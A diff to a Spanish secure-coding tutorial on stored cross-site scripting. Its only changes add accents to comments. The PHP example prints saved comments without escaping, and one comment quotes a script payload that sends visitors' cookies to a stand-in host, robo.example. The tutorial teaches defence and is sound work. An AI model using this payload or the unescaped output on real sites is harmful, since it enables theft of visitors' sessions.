@@ -38,15 +38,15 @@ DOM-BASED (ya visto: innerHTML frente a textContent)
 Un formulario de comentarios, un apodo, una reseña de cliente: cualquier dato de usuario GUARDADO y luego vuelto a mostrar a otros visitantes es un objetivo stored si no se escapa al mostrarlo.
 
 ```php
-// Guardado (sin riesgo aqui por si mismo: solo almacenamos texto)
+// Guardado (sin riesgo aquí por si mismo: solo almacenamos texto)
 $pdo->prepare("INSERT INTO comentarios (texto) VALUES (?)")->execute([$comentario]);
 
-// PELIGROSO: se vuelve a mostrar despues, sin escapado
+// PELIGROSO: se vuelve a mostrar después, sin escapado
 foreach ($comentarios as $c) {
     // si un atacante publico
     // <script>document.location='https://robo.example/?c='+document.cookie</script>,
     echo $c['texto'];
-                        // ESTE CODIGO SE EJECUTA para CADA visitante que ve este comentario
+                        // ESTE Código SE EJECUTA para CADA visitante que ve este comentario
 }
 
 // SEGURO: mismo reflejo que en reflected, aplicado en el momento de MOSTRAR, no de guardar
